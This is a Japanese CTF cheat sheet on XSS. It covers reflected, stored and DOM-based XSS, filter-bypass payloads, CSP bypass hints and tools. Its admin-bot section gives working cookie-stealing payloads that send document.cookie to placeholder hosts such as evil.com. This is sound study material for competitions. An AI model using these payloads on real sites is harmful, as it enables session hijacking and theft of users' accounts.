# XSS (CTF Jeopardy)

## Jeopardy典型パターン

| 問題の特徴 | 種類 | 目標 |
|-----------|------|------|
| 入力がそのまま表示 | Reflected | admin cookie奪取 |
| 掲示板/コメント | Stored | admin bot誘導 |
| URLハッシュ/パラメータ→DOM | DOM XSS | クライアント側実行 |
| Admin botがある | Bot問題 | cookie送信でflag |

## Skill
- 反射/格納/DOMを分類→実行コンテキスト（HTML/attr/JS/CSS/URL）確定
- フィルタ回避：エンコード差、イベント、template literal、svg/mathml
- CSP/TrustedTypes/サニタイザの穴を突く（nonce/strict-dynamic等）

## Jeopardy Workflow
```
1. 入力反映箇所特定: ユニークな文字列を入力して検索
2. コンテキスト判定: HTML? 属性内? JS内?
3. 基本payload試行: <script>alert(1)</script>
4. フィルタ回避: エンコード/イベントハンドラ/別タグ
5. Cookie送信: admin botにflagを吐かせる
```

## Quick Payloads

### 基本
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### フィルタ回避
```html
<!-- 大文字/小文字 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- イベントハンドラ -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg/onload=alert(1)>

<!-- タグ閉じ回避 -->
<script>alert(1)//
<script>alert(1)</script

<!-- 引用符回避 -->
<img src=x onerror=alert`1`>

<!-- エンコード -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

### Cookie窃取 (Admin Bot問題)
```javascript
// Webhook送信
<script>
fetch('https://your-server.com/?c='+document.cookie)
</script>

<img src=x onerror="fetch('https://your-server.com/?c='+document.cookie)">

// 短縮版
<script>location='//evil.com/?'+document.cookie</script>
```

## CSP Bypass
```
CSPヘッダを確認:
- unsafe-inline → 直接script可
- unsafe-eval → eval/Function可
- nonce → nonce値が漏洩していないか確認
- strict-dynamic → base tag injection
```

## Quick Checks
1. 出力点でのエスケープ種類（HTML entity / JS escape / URL encode）
2. innerHTML系 or setAttribute系か
3. **CSPヘッダを必ず見る**
4. Admin botがいる→Cookie窃取がゴール

## Tools
- Burp Suite Repeater
- RequestBin / Webhook.site（callback受信）
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
